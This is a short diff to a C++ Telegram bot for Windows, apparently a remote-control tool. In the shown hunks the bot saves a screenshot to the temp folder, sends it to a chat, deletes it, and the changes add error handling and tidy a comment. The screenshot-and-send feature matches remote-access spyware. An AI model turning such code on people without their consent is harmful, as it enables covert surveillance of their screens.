@@ -24,7 +24,7 @@ void executeIfStandardMode(TgBot::Bot& bot, TgBot::Message::Ptr message, std::fu
 
 
 // Main function
-void startBot(std::string token)
+void startBot(const std::string& token)
 {
 	using namespace std;
 	namespace fs = std::filesystem;
@@ -93,8 +93,9 @@ void startBot(std::string token)
 				char tempPath[MAX_PATH];
 				GetTempPathA(MAX_PATH, tempPath);
 				string tempFile = string(tempPath) + "scrtemp.bmp";
-				takeScreenshot(tempFile);
-				Result result = sendFile(bot, tempFile, chat_id);
+				Result result = takeScreenshot(tempFile);
+				handleResult(result, bot, chat_id);
+				result = sendFile(bot, tempFile, chat_id);
 				handleResult(result, bot, chat_id);
 				result = deleteFile(tempFile);
 				handleResult(result, bot, chat_id);
@@ -260,7 +261,7 @@ void startBot(std::string token)
 
 		while (true) {
 			longPoll.start();
-			std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Reduces CPU usageы
+			std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Reduces CPU usage
 		}
 	}
 	catch (TgBot::TgException& e) {
